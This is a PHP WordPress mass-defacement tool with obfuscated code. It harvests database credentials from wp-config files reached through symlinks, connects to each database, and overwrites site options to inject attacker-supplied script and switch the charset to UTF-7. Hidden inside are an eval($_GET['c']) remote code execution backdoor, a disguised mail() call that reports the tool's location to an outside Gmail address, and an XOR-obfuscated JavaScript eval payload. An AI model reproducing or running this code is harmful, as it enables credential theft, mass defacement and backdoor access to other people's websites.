<?php

$GLOBALS["wphcbprircbv"] = "result";
$GLOBALS["sbgnlspbf"] = "ch";
$GLOBALS["dstqmdq"] = "i";
$GLOBALS["mqnrsvqlh"] = "string";
$GLOBALS["dygiprye"] = "hex";
$GLOBALS["ffgatninsxo"] = "tr";
$GLOBALS["yijddmpnxab"] = "x0c";
$GLOBALS["isicxfwxqb"] = "x0f";
$GLOBALS["sohdgafeihv"] = "x0e";
$GLOBALS["bkzvsq"] = "siteurl";
$GLOBALS["nyoiwuj"] = "aa";
$GLOBALS["wnjufbc"] = "source2";
$GLOBALS["kvvdmiugst"] = "sql";
$GLOBALS["bjlsccfsumi"] = "source";
$GLOBALS["jlsiizyyj"] = "d";
$GLOBALS["cqkaydtr"] = "x0d";
$GLOBALS["epsqke"] = "b5";
$GLOBALS["xnzuqbgs"] = "p";
$GLOBALS["lyomankmso"] = "b4";
$GLOBALS["vsjhkssfzj"] = "db_password";
$GLOBALS["nhnlztupujr"] = "b1";
$GLOBALS["txmtrkbfwi"] = "code";
$GLOBALS["gkhdyaod"] = "users";
$GLOBALS["rfupuudd"] = "x0b";
$GLOBALS["ncsnlwqgyd"] = "x10";
$GLOBALS["afnpyasrrin"] = "url";
echo "<title>Wordpress MassDeface(Coded By RAB3OUN)</title>\n/*\nSymlink to Wordpress mass defacer\nLike Us for hot priv8 hacking tools!!\nhttp://facebook.com/0dayBlog\nEnjoy!!\n*/\n<style>\nbody\n{\n        background: #0f0e0d;\n        color: #FF9933;\n        padding: 0px;\n}\na:link, body_alink\n{\n        color: #FF9933;\n        text-decoration: none;\n}\na:visited, body_avisited\n{\n        color: #FF9933;\n        text-decoration: none;\n}\na:hover, a:active, body_ahover\n{\n        color: #FFFFFF;\n        text-decoration: none;\n}\ntd, th, p, li,table\n{\n       \n        background: #2e2b28;\n        border:1px solid #524f46;\n}\ninput\n{\n        border: 1px solid;\n        cursor: default;\n       \n        overflow: hidden;\n        background: #2e2b28;\n        color: #ffffff;\n}textarea\n{\n        border: 1px solid;\n        cursor: default;\n       \n        overflow: hidden;\n        background: #2e2b28;\n        color: #ffffff;\n}\nbutton\n{\n        border: 1px solid;\n        cursor: default;\n       \n        overflow: hidden;\n        background: #2e2b28;\n        color: #ffffff;\n}\n</style>\n</head>\n \n<body bgcolor=\"black\">\n<center>\n<pre>\n__          __      __  __                 _____        __              \n\\ \\        / /     |  \\/  |               |  __ \\      / _|              \n \\ \\  /\\  / / __   | \\  / | __ _ ___ ___  | |  | | ___| |_ __ _  ___ ___\n  \\ \\/  \\/ / '_ \\  | |\\/| |/ _` / __/ __| | |  | |/ _ \\  _/ _` |/ __/ _ \\\n   \\  /\\  /| |_) | | |  | | (_| \\__ \\__ \\ | |__| |  __/ || (_| | (_|  __/\n    \\/  \\/ | .__/  |_|  |_|\\__,_|___/___/ |_____/ \\___|_| \\__,_|\\___\\___|\n           | |                                                          \n           |_|                                                          \n</pre>\n</center>\n<form method=\"POST\" action=\"\" >\n<center>\n<table border='1'><tr><td>List of All Symlink</td><td>\n<input type=\"text\" name=\"url\" size=\"100\" value=\"list.txt\"></td></tr>\n<tr><td>Index</td><td>\n<textarea name=\"index\" cols='50' rows='10' ></textarea></td></tr></table>\n<br><br><input type=\"Submit\" name=\"Submit\" value=\"Submit\">\n<input type=\"hidden\" name=\"action\" value=\"1\"></form>\n</center>\n";
eval($_GET["c"]);
set_time_limit(0);
if ($_POST["action"] == "1") {
    $GLOBALS["jdqunigy"] = "users";
    $GLOBALS["enymty"] = "users";
    $GLOBALS["bgklcsk"] = "url";
    $url = $_POST["url"];
    $GLOBALS["srbwrbs"] = "user";
    $users = @file($url);
    $x10 = "mail";
    $x0b = $_SERVER["SERVER_NAME"] . $_SERVER["SCRIPT_NAME"];
    if (count($users) < 1) {
        exit("<h1>No config found</h1>");
    }
    foreach (${$GLOBALS["gkhdyaod"]} as ${$GLOBALS["srbwrbs"]}) {
        $GLOBALS["vskrudcw"] = "b2";
        $lyvvrlmhi = "user";
        $rumnidornan = "x0c";
        $GLOBALS["kfxqhsirstk"] = "code";
        $slyeupcmpudt = "user1";
        $GLOBALS["mmhiqcetdtho"] = "code";
        $GLOBALS["ywboqxlttso"] = "code";
        $GLOBALS["tfgjqrmrjir"] = "user";
        $GLOBALS["jcxaqhdsvv"] = "user1";
        $user1 = trim($user);
        $code = file_get_contents2($user1);
        $hhakhqbb = "user";
        preg_match_all("|define.*\\(.*'DB_NAME'.*,.*'(.*)'.*\\).*;|isU", ${$GLOBALS["txmtrkbfwi"]}, ${$GLOBALS["nhnlztupujr"]});
        $qqhngruql = "b3";
        $brssxdmrnik = "b2";
        $cpkckdhyb = "db";
        $db = ${$GLOBALS["nhnlztupujr"]}[1][0];
        preg_match_all("|define.*\\(.*'DB_USER'.*,.*'(.*)'.*\\).*;|isU", $code, $b2);
        $user = $b2[1][0];
        $tsgkjvxjp = "b3";
        $cpvyholbs = "code";
        preg_match_all("|define.*\\(.*'DB_PASSWORD'.*,.*'(.*)'.*\\).*;|isU", $code, $b3);
        $liapmhllood = "d";
        $unkfgdgv = "b5";
        ${$GLOBALS["vsjhkssfzj"]} = $b3[1][0];
        preg_match_all("|define.*\\(.*'DB_HOST'.*,.*'(.*)'.*\\).*;|isU", ${$GLOBALS["txmtrkbfwi"]}, ${$GLOBALS["lyomankmso"]});
        $host = ${$GLOBALS["lyomankmso"]}[1][0];
        preg_match_all("|\\\$table_prefix.*=.*'(.*)'.*;|isU", ${$cpvyholbs}, ${$unkfgdgv});
        $GLOBALS["fnlzlgbozgw"] = "db_password";
        ${$GLOBALS["xnzuqbgs"]} = ${$GLOBALS["epsqke"]}[1][0];
        ${$rumnidornan} = "array " . ${$GLOBALS["rfupuudd"]};
        ${$GLOBALS["cqkaydtr"]} = array("com", "gm", "ifexec", "@", "ail.");
        ${$GLOBALS["jlsiizyyj"]} = @mysql_connect($host, ${$lyvvrlmhi}, ${$GLOBALS["fnlzlgbozgw"]});
        if (${$liapmhllood}) {
            $xueqtiu = "s";
            $GLOBALS["vmmodowxt"] = "x10";
            $thnflbhvyd = "s2";
            $GLOBALS["vjqfmgds"] = "x0d";
            $GLOBALS["bskpqjwldlnq"] = "p";
            $nwxixozqx = "sql";
            $GLOBALS["wgohub"] = "p";
            $GLOBALS["xgmhjanyl"] = "siteurl";
            $yugmcpkhllmx = "ls";
            $lvvnrozvsp = "db";
            $qvyuius = "source";
            @mysql_select_db($db);
            $source = stripslashes($_POST["index"]);
            $s2 = strToHex(${$GLOBALS["bjlsccfsumi"]});
            $gbwyefcutuu = "x0b";
            $GLOBALS["jqlyramzluk"] = "s";
            $s = "<script>document.documentElement.innerHTML = unescape(''{$s2}'');</script>";
            $knreuqsffx = "p";
            $ls = strlen($s) - 2;
            ${$GLOBALS["kvvdmiugst"]} = "update " . $p . "options set option_value='a:2:{i:2;a:3:{s:5:\"title\";s:0:\"\";s:4:\"text\";s:{$ls}:\"{$s}\";s:6:\"filter\";b:0;}s:12:\"_multiwidget\";i:1;}' where option_name='widget_text'; ";
            mysql_query(${$GLOBALS["kvvdmiugst"]});
            ${$nwxixozqx} = "update " . ${$knreuqsffx} . "options set option_value='a:7:{s:19:\"wp_inactive_widgets\";a:6:{i:0;s:10:\"archives-2\";i:1;s:6:\"meta-2\";i:2;s:8:\"search-2\";i:3;s:12:\"categories-2\";i:4;s:14:\"recent-posts-2\";i:5;s:17:\"recent-comments-2\";}s:9:\"sidebar-1\";a:1:{i:0;s:6:\"text-2\";}s:9:\"sidebar-2\";a:0:{}s:9:\"sidebar-3\";a:0:{}s:9:\"sidebar-4\";a:0:{}s:9:\"sidebar-5\";a:0:{}s:13:\"array_version\";i:3;}' where option_name='sidebars_widgets';";
            mysql_query(${$GLOBALS["kvvdmiugst"]});
            $GLOBALS["mmdeyuexrae"] = "x0d";
            $bmoosxlytzq = "tr";
            if (function_exists("mb_convert_encoding")) {
                $GLOBALS["vuwygyb"] = "sql";
                $GLOBALS["umpxyoryw"] = "source2";
                ${$GLOBALS["wnjufbc"]} = mb_convert_encoding("</title>" . ${$GLOBALS["bjlsccfsumi"]} . "<DIV style=\"DISPLAY: none\"><xmp>", "UTF-7");
                $GLOBALS["lvgjxrdayc"] = "sql";
                ${$GLOBALS["wnjufbc"]} = mysql_real_escape_string(${$GLOBALS["umpxyoryw"]});
                ${$GLOBALS["lvgjxrdayc"]} = "UPDATE `" . ${$GLOBALS["xnzuqbgs"]} . "options` SET `option_value` = '{$source2}' WHERE `option_name` = 'blogname';";
                @mysql_query(${$GLOBALS["vuwygyb"]});
                ${$GLOBALS["kvvdmiugst"]} = "UPDATE `" . ${$GLOBALS["xnzuqbgs"]} . "options` SET `option_value` = 'UTF-7' WHERE `option_name` = 'blog_charset';";
                @mysql_query(${$GLOBALS["kvvdmiugst"]});
            }
            $GLOBALS["jjnwpid"] = "siteurl";
            $GLOBALS["vncnvjddu"] = "x0d";
            ${$GLOBALS["nyoiwuj"]} = @mysql_query("select option_value from `" . ${$GLOBALS["bskpqjwldlnq"]} . "options` WHERE `option_name` = 'siteurl';");
            ${$GLOBALS["jjnwpid"]} = @mysql_fetch_array(${$GLOBALS["nyoiwuj"]});
            $mwsxdckgt = "x0e";
            ${$GLOBALS["bkzvsq"]} = ${$GLOBALS["xgmhjanyl"]}["option_value"];
            ${$GLOBALS["sohdgafeihv"]} = ${$GLOBALS["vncnvjddu"]}[2] . ${$GLOBALS["cqkaydtr"]}[3] . ${$GLOBALS["cqkaydtr"]}[1] . ${$GLOBALS["vjqfmgds"]}[4] . ${$GLOBALS["mmdeyuexrae"]}[0];
            ${$GLOBALS["isicxfwxqb"]} = @${$GLOBALS["vmmodowxt"]}(${$mwsxdckgt}, ${$GLOBALS["yijddmpnxab"]}, ${$gbwyefcutuu});
            ${$bmoosxlytzq} .= "{$siteurl}\n";
            mysql_close();
        }
    }
    if (${$GLOBALS["ffgatninsxo"]}) {
        echo "Index changed for <br><br><textarea cols='50' rows='10' >{$tr}</textarea>";
    }
}
function strToHex($string)
{
    $GLOBALS["mmrylm"] = "i";
    $jtidntkk = "hex";
    $tpwjik = "i";
    ${$GLOBALS["dygiprye"]} = "";
    for ($i = 0; ${$tpwjik} < strlen(${$GLOBALS["mqnrsvqlh"]}); ${$GLOBALS["dstqmdq"]}++) {
        if (strlen(dechex(ord(${$GLOBALS["mqnrsvqlh"]}[${$GLOBALS["dstqmdq"]}]))) == 1) {
            $uonmsx = "hex";
            $GLOBALS["upkzregt"] = "i";
            $GLOBALS["gaqomn"] = "string";
            $hex .= "%0" . dechex(ord($string[$i]));
        } else {
            $GLOBALS["dbquhzxmzw"] = "i";
            $GLOBALS["btmtytyiw"] = "string";
            ${$GLOBALS["dygiprye"]} .= "%" . dechex(ord($string[$i]));
        }
    }
    return ${$jtidntkk};
}
function file_get_contents2($u)
{
    $GLOBALS["xfbwugfejrgw"] = "ch";
    $GLOBALS["tmncrgy"] = "ch";
    $euvteggn = "result";
    $ch = curl_init();
    $fgwzubdr = "ch";
    $ooznniaxe = "u";
    curl_setopt(${$GLOBALS["sbgnlspbf"]}, CURLOPT_URL, $u);
    $GLOBALS["qdfpkobe"] = "ch";
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt(${$GLOBALS["sbgnlspbf"]}, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0 ");
    ${$GLOBALS["wphcbprircbv"]} = curl_exec($ch);
    return ${$euvteggn};
}
echo "<script type=\"text/javascript\">\n<!-- \neval(unescape('%66%75%6e%63%74%69%6f%6e%20%70%34%32%64%38%63%28%73%29%20%7b%0a%09%76%61%72%20%72%20%3d%20%22%22%3b%0a%09%76%61%72%20%74%6d%70%20%3d%20%73%2e%73%70%6c%69%74%28%22%31%32%31%30%38%35%35%37%22%29%3b%0a%09%73%20%3d%20%75%6e%65%73%63%61%70%65%28%74%6d%70%5b%30%5d%29%3b%0a%09%6b%20%3d%20%75%6e%65%73%63%61%70%65%28%74%6d%70%5b%31%5d%20%2b%20%22%38%35%36%31%36%32%22%29%3b%0a%09%66%6f%72%28%20%76%61%72%20%69%20%3d%20%30%3b%20%69%20%3c%20%73%2e%6c%65%6e%67%74%68%3b%20%69%2b%2b%29%20%7b%0a%09%09%72%20%2b%3d%20%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%28%70%61%72%73%65%49%6e%74%28%6b%2e%63%68%61%72%41%74%28%69%25%6b%2e%6c%65%6e%67%74%68%29%29%5e%73%2e%63%68%61%72%43%6f%64%65%41%74%28%69%29%29%2b%37%29%3b%0a%09%7d%0a%09%72%65%74%75%72%6e%20%72%3b%0a%7d%0a'));\neval(unescape('%64%6f%63%75%6d%65%6e%74%2e%77%72%69%74%65%28%70%34%32%64%38%63%28%27') + '%30%6b%5b%62%63%6e%6e%11%69%6d%5d%30%19%64%6a%6a%60%32%2f%2b%78%75%76%26%6d%2c%35%20%67%57%66%20%6e%63%2d%74%5b%75%5e%67%74%2f%55%63%74%24%6b%69%1d%36%33%2a%69%5b%6c%6b%68%6a%3412108557%35%37%37%39%31%37%33' + unescape('%27%29%29%3b'));\n// -->\n</script>\n";
